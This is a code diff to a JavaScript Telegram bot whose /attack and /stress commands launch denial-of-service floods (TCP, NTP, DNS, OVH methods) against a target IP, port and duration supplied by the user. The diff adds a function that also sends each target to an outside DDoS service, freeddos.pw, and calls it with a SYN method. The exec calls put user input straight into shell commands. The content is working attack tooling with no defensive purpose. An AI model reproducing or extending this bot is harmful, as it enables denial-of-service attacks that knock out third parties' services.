@@ -341,6 +341,14 @@ bot.onText(/\/attack (.+) (.+) (.+)(?: (.+))?/, async (msg, match) => {
   }
 });
 
+// req ke freeddos.pw
+function sendRequest(ip, port, time, method) {
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://freeddos.pw/', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  const data = `ip=${ip}&port=${port}&time=${time}&method=${method}`;
+  xhr.send(data);
+}
 
 bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
   const chatId = msg.chat.id;
@@ -364,6 +372,7 @@ bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
       break;
       case 'tcp':
       exec(`node methods/tcp.js ${target} ${port} ${duration}`)
+      sendRequest(target, port, duration, 'SYN');
       exec(`node methods/ntp.js ${target} ${port} ${duration}`)
       exec(`node methods/dns.js ${target} ${port} ${duration}`)
       exec(`node methods/ovh.js ${target} ${port} ${duration}`)
